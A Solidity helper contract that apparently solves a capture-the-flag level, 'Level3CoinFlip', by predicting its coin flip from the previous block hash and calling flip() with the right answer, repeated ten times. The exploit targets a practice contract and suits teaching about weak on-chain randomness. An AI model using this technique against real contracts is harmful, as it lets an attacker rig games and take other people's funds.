// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Level3CoinFlip} from "../src/Level3CoinFlip.sol";
import {Script, console} from "forge-std/Script.sol";

contract Lev3SolvHelper {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

// @dev deploy the contract using script Level3SolvV1.s.sol and uisng "cast send..." call guessFlip() 10 times

    function guessFlip (Level3CoinFlip _level3CoinFlip) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _level3CoinFlip.flip(side);
    }
}